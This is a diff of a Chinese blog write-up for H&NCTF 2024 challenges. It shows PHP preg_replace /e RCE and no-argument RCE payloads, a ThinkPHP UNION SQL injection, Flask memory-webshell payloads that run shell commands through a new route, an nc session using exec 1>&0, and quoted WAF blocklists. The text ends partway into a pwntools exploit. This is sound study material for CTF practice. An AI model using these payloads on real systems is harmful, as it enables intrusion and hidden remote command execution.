@@ -147,171 +147,110 @@ golden的部落阁 = title写得真好</title>
   <div class="body md" itemprop="articleBody">
     
 
-    <h1 id="web"><a class="markdownIt-Anchor" href="#web">#</a> Web</h1>
-<h2 id="please_rce_me"><a class="markdownIt-Anchor" href="#please_rce_me">#</a> Please_RCE_Me</h2>
-<p><img data-src="https://img-blog.csdnimg.cn/img_convert/32f566d418dc4544b9e20d8d13411b66.png" alt="Screenshot 2024-05-12 131227.png"></p>
-<pre><code>	GET传参输入?moran=flag，之后获取源码：
+    <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Please-RCE-Me"><a href="#Please-RCE-Me" class="headerlink" title="Please_RCE_Me"></a>Please_RCE_Me</h2><p><img data-src="https://img-blog.csdnimg.cn/img_convert/32f566d418dc4544b9e20d8d13411b66.png" alt="Screenshot 2024-05-12 131227.png"></p>
+<pre><code>    GET传参输入?moran=flag，之后获取源码：
 </code></pre>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;moran&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>];</span><br><span class="line">        <span class="variable">$str2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#x27;</span>,<span class="variable">$str1</span>) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$str2</span>) != <span class="number">19</span> || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/please_give_me_flag/&#x27;</span>,<span class="variable">$str2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/please_give_me_flag/ei&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;moran want a flag.&lt;/br&gt;(?moran=flag)&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<pre><code>	这个是RCE吗？
 
-	审一审。成功找到了漏洞点，preg_replace(&quot;/please_give_me_flag/ei&quot;,![](https://www.yuque.com/api/services/graph/generate_redirect/latex?_POST%5B'task'%5D%2C#card=math&amp;code=_POST%5B%27task%27%5D%2C&amp;id=o3Kvv)_POST['flag']);可以看到，存在/e模式，再看看PHP版本，5.6.40，可能存在/e的命令执行漏洞。
+<pre><code>    这个是RCE吗？
 
-	前面，需要绕的Waf第一个为：
+    审一审。成功找到了漏洞点，preg_replace(&quot;/please_give_me_flag/ei&quot;,![](https://www.yuque.com/api/services/graph/generate_redirect/latex?_POST%5B&#39;task&#39;%5D%2C#card=math&amp;code=_POST%5B%27task%27%5D%2C&amp;id=o3Kvv)_POST[&#39;flag&#39;]);可以看到，存在/e模式，再看看PHP版本，5.6.40，可能存在/e的命令执行漏洞。
+
+    前面，需要绕的Waf第一个为：
 </code></pre>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |.|include|require|flag/i&#x27;,$str1)</span><br></pre></td></tr></table></figure>
-<pre><code>	这个绕过先放放，看看后面两个：
-</code></pre>
-<blockquote>
-<p>strlen(str2) != 19 || preg_match(’/please_give_me_flag/’,str2)</p>
-</blockquote>
-<pre><code>	因为都是逻辑或，所以得让他们都为False，刚好，please_give_me_flag 长度为19，第二个正则刚好是大小写敏感，所以大小写混合绕过。
 
-	然后就是补充下关于/e模式的问题：
+
+<pre><code>    这个绕过先放放，看看后面两个：
 </code></pre>
 <blockquote>
-<p>preg_replace 使用了 /e 模式，导致可以代码执行，而且该函数的第一个和第三个参数都是我们可以控制的。我们都知道， preg_replace 函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图 preg_replace 函数的第二个参数）当做代码来执行</p>
+<p>strlen(str2) !&#x3D; 19 || preg_match(‘&#x2F;please_give_me_flag&#x2F;‘,str2)</p>
 </blockquote>
-<pre><code>	最后尝试下phpinfo：
+<pre><code>    因为都是逻辑或，所以得让他们都为False，刚好，please_give_me_flag 长度为19，第二个正则刚好是大小写敏感，所以大小写混合绕过。
+
+    然后就是补充下关于/e模式的问题：
+</code></pre>
+<blockquote>
+<p>preg_replace 使用了 &#x2F;e 模式，导致可以代码执行，而且该函数的第一个和第三个参数都是我们可以控制的。我们都知道， preg_replace 函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图 preg_replace 函数的第二个参数）当做代码来执行</p>
+</blockquote>
+<pre><code>    最后尝试下phpinfo：
 </code></pre>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//POST传参</span><br><span class="line">flag=Please_give_me_flag&amp;task=phpinfo()</span><br></pre></td></tr></table></figure>
-<p><img data-src="https://img-blog.csdnimg.cn/img_convert/5360c207b3d310e77b32d9bc41be09d4.png" alt="Screenshot 2024-05-12 132313.png"></p>
-<pre><code>	成功打出组合拳。
 
-	再回头看看第一个过滤，看上去几乎把所有的shell函数都过滤了。推测flag在根目录，那么学着使用无参数RCE的方式打这套组合拳，payload如下：
+
+<p><img data-src="https://img-blog.csdnimg.cn/img_convert/5360c207b3d310e77b32d9bc41be09d4.png" alt="Screenshot 2024-05-12 132313.png"></p>
+<pre><code>    成功打出组合拳。
+
+    再回头看看第一个过滤，看上去几乎把所有的shell函数都过滤了。推测flag在根目录，那么学着使用无参数RCE的方式打这套组合拳，payload如下：
 </code></pre>
 <blockquote>
-<p>flag=Please_give_me_flag&amp;task=chdir(&quot;/&quot;)|highlight_file(scandir(pos(localeconv()))[7])</p>
+<p>flag&#x3D;Please_give_me_flag&amp;task&#x3D;chdir(“&#x2F;“)|highlight_file(scandir(pos(localeconv()))[7])</p>
 </blockquote>
-<p>最后得到 flag</p>
+<p>最后得到flag</p>
 <p><img data-src="https://img-blog.csdnimg.cn/img_convert/c6799817df231c2c29d719c55eb21a19.png" alt="Screenshot 2024-05-12 132839.png"></p>
-<h2 id="ez_tp复现"><a class="markdownIt-Anchor" href="#ez_tp复现">#</a> ez_tp（复现）</h2>
-<p>看起来像是 thinkphp 的题，不过，是非预期的题，用平常的 payload 一把梭怕是不对，所以，还能怎么搞？下在附件下来审审吧。<br>
-在附件 /ez_tp/App/Home/Controller 中存在 IndexController.class.php 文件，打开看看：<br>
-这应该是一个路由吧：</p>
+<h2 id="ez-tp（复现）"><a href="#ez-tp（复现）" class="headerlink" title="ez_tp（复现）"></a>ez_tp（复现）</h2><p>看起来像是thinkphp的题，不过，是非预期的题，用平常的payload一把梭怕是不对，所以，还能怎么搞？下在附件下来审审吧。<br>在附件&#x2F;ez_tp&#x2F;App&#x2F;Home&#x2F;Controller中存在IndexController.class.php文件，打开看看：<br>这应该是一个路由吧：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public function h_n()</span><br></pre></td></tr></table></figure>
-<p>路由应该是 h_n，那么，应该怎么打呢？不知道为啥，复现的时候日志找不到了，看 dalao 们的 wp 的时候，都说的是根据后台的日志有 payload，但是现在跑去找又找不到了。<br>
-继续往后面审计，发现了如下代码</p>
+<p>路由应该是h_n，那么，应该怎么打呢？不知道为啥，复现的时候日志找不到了，看dalao们的wp的时候，都说的是根据后台的日志有payload，但是现在跑去找又找不到了。<br>继续往后面审计，发现了如下代码</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$name = I(<span class="string">&#x27;GET.name&#x27;</span>);</span><br></pre></td></tr></table></figure>
-<p>好，知道了需要通过 get 传参，还是 GET 传参。</p>
+<p>好，知道了需要通过get传参，还是GET传参。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$pattern = <span class="string">&quot;insert|update|delete|and|or|\/\*|\*|\.\.\/|\.\/|into|load_file|outfile|dumpfile|sub|hex&quot;</span>;</span><br><span class="line">            $pattern.= <span class="string">&quot;|file_put_contents|fwrite|curl|system|eval|assert&quot;</span>;</span><br><span class="line">            $pattern.= <span class="string">&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;</span>;</span><br><span class="line">            $pattern.= <span class="string">&quot;|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec&quot;</span>;</span><br><span class="line">            $vpattern = explode(<span class="string">&quot;|&quot;</span>, $pattern);</span><br><span class="line">            $<span class="built_in">bool</span> = false;</span><br><span class="line">            foreach ($<span class="built_in">input</span> <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                foreach ($vpattern <span class="keyword">as</span> $value) &#123;</span><br><span class="line">                    foreach ($v <span class="keyword">as</span> $kk =&gt; $vv) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/$value/i&quot;</span>, $vv)) &#123;</span><br><span class="line">                            $<span class="built_in">bool</span> = true;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> ($<span class="built_in">bool</span>) <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ($<span class="built_in">bool</span>) <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $<span class="built_in">bool</span>;</span><br></pre></td></tr></table></figure>
-<p>这里大概审一下就是，检测所有的键值对中，是否存在黑名单字段，所以，我们传入的参数键值对都不能出现黑名单字段，因此，文件包含和 RCE 没法打，再看看下面的这段代码：</p>
+<p>这里大概审一下就是，检测所有的键值对中，是否存在黑名单字段，所以，我们传入的参数键值对都不能出现黑名单字段，因此，文件包含和RCE没法打，再看看下面的这段代码：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (waf())&#123;</span><br><span class="line">            $this-&gt;index();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $ret = $User-&gt;field(<span class="string">&#x27;username,age&#x27;</span>)-&gt;where(array(<span class="string">&#x27;username&#x27;</span>=&gt;$name))-&gt;select();</span><br><span class="line">            echo var_export($ret, true);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
-<p>猜测应该这儿应该有个 sql 注入存在，并且没有过滤 select，所以，根据 thinkphp 的以前的 payload，以及大佬的 wp 中说的日志中的信息，可以得知 payload 为：</p>
+<p>猜测应该这儿应该有个sql注入存在，并且没有过滤select，所以，根据thinkphp的以前的payload，以及大佬的wp中说的日志中的信息，可以得知payload为：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/home/index/h_n？name[<span class="number">0</span>]=exp&amp;name[<span class="number">1</span>]=%3d%27test123%<span class="number">27</span>%20union%20select%<span class="number">201</span>,flag%<span class="number">20</span><span class="keyword">from</span>%20flag</span><br></pre></td></tr></table></figure>
-<p>最后得到了 flag： array (0 =&gt; array ( ‘username’ =&gt; ‘1’, ‘age’ =&gt; ‘H&amp;NCTF {Cjp_6c3114ee-23e1-459b-ad88-9b29ccfde934}’, ), )</p>
-<h2 id="ezflask复现"><a class="markdownIt-Anchor" href="#ezflask复现">#</a> ezFlask（复现）</h2>
-<p>题目没出 flask，但是好在了解了一个新的 flask 的 ssti 的姿势，记录在这儿，不知道为啥，跟着 wp 复现，却还是失败了，先记录吧，之后再改。<br>
-首先，打开网页就给了个提示：</p>
-<div class="note info">
-<p>冒险即将开始！！！ 请移步 / Adventure 路由进行命令执行，后端语句为： cmd = request.form [‘cmd’] eval (cmd) 注意，你仅有一次机会，在进行唯一一次成功的命令执行后生成 flag 并写入 /flag 执行无回显，目录没权限部分命令 ban，也不要想着写文件～</p>
-</div>
-<h3 id="失败情况"><a class="markdownIt-Anchor" href="#失败情况">#</a> 失败情况：</h3>
-<p>大概跟他提示的一样，就是一个命令执行，不过没思路，很可惜，看了下 wp，说的是写入内存马到一个路由里，但是我复现却失败了，不知是为何，他给的内存马的 payload 能成功写入，并且能访问到写入的路由，但是，却会报 500 错误，不知是为何，等官方 wp 出了再看看是为啥吧，payload 先写在下面。</p>
+<p>最后得到了flag： array ( 0 &#x3D;&gt; array ( ‘username’ &#x3D;&gt; ‘1’, ‘age’ &#x3D;&gt; ‘H&amp;NCTF{Cjp_6c3114ee-23e1-459b-ad88-9b29ccfde934}’, ), )  </p>
+<h2 id="ezFlask（复现）"><a href="#ezFlask（复现）" class="headerlink" title="ezFlask（复现）"></a>ezFlask（复现）</h2><p>题目没出flask，但是好在了解了一个新的flask的ssti的姿势，记录在这儿，不知道为啥，跟着wp复现，却还是失败了，先记录吧，之后再改。<br>首先，打开网页就给了个提示：<br>:::info<br>冒险即将开始！！！ 请移步&#x2F;Adventure路由进行命令执行，后端语句为： cmd &#x3D; request.form[‘cmd’] eval(cmd) 注意，你仅有一次机会，在进行唯一一次成功的命令执行后生成flag并写入&#x2F;flag 执行无回显，目录没权限部分命令ban，也不要想着写文件~<br>:::</p>
+<h3 id="失败情况："><a href="#失败情况：" class="headerlink" title="失败情况："></a>失败情况：</h3><p>大概跟他提示的一样，就是一个命令执行，不过没思路，很可惜，看了下wp，说的是写入内存马到一个路由里，但是我复现却失败了，不知是为何，他给的内存马的payload能成功写入，并且能访问到写入的路由，但是，却会报500错误，不知是为何，等官方wp出了再看看是为啥吧，payload先写在下面。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=render_template_string(<span class="string">&quot;&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](\&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;myshell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;)).read())\&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
-<h3 id="成功情况"><a class="markdownIt-Anchor" href="#成功情况">#</a> 成功情况：</h3>
-<p>找到了另一个 payload，同样是内存马，payload 如下：</p>
+<h3 id="成功情况："><a href="#成功情况：" class="headerlink" title="成功情况："></a>成功情况：</h3><p>找到了另一个payload，同样是内存马，payload如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=app.add_url_rule(<span class="string">&#x27;/test&#x27;</span>,<span class="string">&#x27;test&#x27;</span>,<span class="keyword">lambda</span>:<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.args.get(<span class="string">&#x27;cmd&#x27;</span>)).read())</span><br></pre></td></tr></table></figure>
-<p>之后访问 /test?cmd=cat+/flag 成功出 flag：flag {42ae8a8b-4f88-4c45-a162-bd1881da16ea}。</p>
-<h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn">#</a> Pwn:</h1>
-<h2 id="close"><a class="markdownIt-Anchor" href="#close">#</a> close</h2>
-<pre><code>	逆天题目，纯牛马出题人，想暴打。
+<p>之后访问&#x2F;test?cmd&#x3D;cat+&#x2F;flag成功出flag：flag{42ae8a8b-4f88-4c45-a162-bd1881da16ea}。</p>
+<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn:"></a>Pwn:</h1><h2 id="close"><a href="#close" class="headerlink" title="close"></a>close</h2><pre><code>    逆天题目，纯牛马出题人，想暴打。
 
-	拿到题目第一件事儿是检查保护，这个题保护也就那样，PIE加NX。
+    拿到题目第一件事儿是检查保护，这个题保护也就那样，PIE加NX。
 </code></pre>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@g01den-virtual-machine:/mnt/shared# checksec pwn</span><br><span class="line">[*] &#x27;/mnt/shared/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
-<pre><code>	反编译看看：
+
+<pre><code>    反编译看看：
 </code></pre>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;**********************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*     Welcome to the H&amp;NCTF!     *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;**********************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*             *****              *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*            *     *             *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*           *  o o  *            *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*          *    v    *           *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*         *  *     *  *          *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*         * * * * * * *          *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;**********************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*      Do you know close?        *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;**********************************&quot;</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<pre><code>	这题目什么玩意儿？关闭了标准输出流还玩儿毛线？
 
-	算了，老老实实干就完了。经过长时间查找资料，最后找到了做法。
+<pre><code>    这题目什么玩意儿？关闭了标准输出流还玩儿毛线？
+
+    算了，老老实实干就完了。经过长时间查找资料，最后找到了做法。
 </code></pre>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@g01den-virtual-machine:/mnt/shared<span class="meta"># nc hnctf.imxbt.cn 35345</span></span><br><span class="line">ls</span><br><span class="line">ls: write error: Bad file descriptor</span><br><span class="line">exec <span class="number">1</span>&gt;&amp;<span class="number">0</span></span><br><span class="line">cat flag</span><br><span class="line">H-NCTF&#123;<span class="number">8</span>d409dad<span class="number">-4b</span>2f<span class="number">-4687</span><span class="number">-9f</span>17<span class="number">-8b</span>450a76946c&#125;</span><br></pre></td></tr></table></figure>
-<pre><code>	心中暗暗暴打出题人两分钟泄愤。    (*￣︿￣)
+
+<pre><code>    心中暗暗暴打出题人两分钟泄愤。    (*￣︿￣)
 </code></pre>
-<h2 id="ez_pwn复现exp是大佬的有时间自己再写个exp"><a class="markdownIt-Anchor" href="#ez_pwn复现exp是大佬的有时间自己再写个exp">#</a> ez_pwn（复现，exp 是大佬的，有时间自己再写个 exp）</h2>
-<p>看到这个题，我突然觉得我是个执杖，我还以为是出题人故意搞我心态，结果是我学艺不精的缘故，好吧，我的问题，没看出来，我摊牌了，我是个 XX。<br>
-好吧，老样子，Ubuntu 启动！！！<br>
-还是先查看保护：</p>
+<h2 id="ez-pwn（复现，exp是大佬的，有时间自己再写个exp）"><a href="#ez-pwn（复现，exp是大佬的，有时间自己再写个exp）" class="headerlink" title="ez_pwn（复现，exp是大佬的，有时间自己再写个exp）"></a>ez_pwn（复现，exp是大佬的，有时间自己再写个exp）</h2><p>看到这个题，我突然觉得我是个执杖，我还以为是出题人故意搞我心态，结果是我学艺不精的缘故，好吧，我的问题，没看出来，我摊牌了，我是个XX。<br>好吧，老样子，Ubuntu启动！！！<br>还是先查看保护：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@g01den-virtual-machine:/mnt/shared<span class="comment"># checksec pwn</span></span><br><span class="line">[*] <span class="string">&#x27;/mnt/shared/pwn&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
-<p>然后 IDA 反编译，漏洞函数为：</p>
+<p>然后IDA反编译，漏洞函数为：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-2Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>发现了点东西，就是，这里存在一些问题，就是，read 函数读取的数据为 48 字节，但是，经过动态调试得出的缓冲区 s 的大小为 44 字节，好好好，IDA 你又得记大过了。<br>
-之后，第一次不需要溢出，将缓冲区全部写满即可，因为存在 % s 这个格式串配合 printf 函数，所以，能够直接把 rbp 的值给打印出来，所以只需要接收之后，就可以拿到 rbp 的值了，然后，通过动态调试得到的 rbp 的地址与缓冲区 buf 的地址，就可以拿到字符串的地址了。<br>
-<img data-src="https://img-blog.csdnimg.cn/img_convert/274c8e349eb022da9e344e7bc10beaf3.png" alt="Screenshot 2024-05-14 234816.png"><br>
-<img data-src="https://img-blog.csdnimg.cn/img_convert/5b55b3705f40fde32011de08190abef9.png" alt="Screenshot 2024-05-14 234826.png"><br>
- 接收到了 rbp 的值之后，减去 56 就可以得到字符串的地址了。<br>
-之后则是需要通过栈调用 read 函数，向 bss 段写入 sh;（这里我没弄懂为啥不能直接传 /bin/sh，而是要传 sh; 进去），之后重新调用 main 函数重新运行程序，不过，到了这里之后会出一点问题，那就是，第二次进入 main 之后，栈的布局会发生变化，重新进入 vul 函数之后，里面的指针指向的是 vul 函数内的字符串，而不是之前那个，所以这里需要重新进行一次字符串地址的泄露，之后才能对栈进行布局来调用 system 函数。<br>
-大佬的 exp 如下：</p>
+<p>发现了点东西，就是，这里存在一些问题，就是，read函数读取的数据为48字节，但是，经过动态调试得出的缓冲区s的大小为44字节，好好好，IDA你又得记大过了。<br>之后，第一次不需要溢出，将缓冲区全部写满即可，因为存在%s这个格式串配合printf函数，所以，能够直接把rbp的值给打印出来，所以只需要接收之后，就可以拿到rbp的值了，然后，通过动态调试得到的rbp的地址与缓冲区buf的地址，就可以拿到字符串的地址了。<br><img data-src="https://img-blog.csdnimg.cn/img_convert/274c8e349eb022da9e344e7bc10beaf3.png" alt="Screenshot 2024-05-14 234816.png"><br><img data-src="https://img-blog.csdnimg.cn/img_convert/5b55b3705f40fde32011de08190abef9.png" alt="Screenshot 2024-05-14 234826.png"><br>接收到了rbp的值之后，减去56就可以得到字符串的地址了。<br>之后则是需要通过栈调用read函数，向bss段写入sh;（这里我没弄懂为啥不能直接传&#x2F;bin&#x2F;sh，而是要传sh;进去），之后重新调用main函数重新运行程序，不过，到了这里之后会出一点问题，那就是，第二次进入main之后，栈的布局会发生变化，重新进入vul函数之后，里面的指针指向的是vul函数内的字符串，而不是之前那个，所以这里需要重新进行一次字符串地址的泄露，之后才能对栈进行布局来调用system函数。<br>大佬的exp如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line">IP 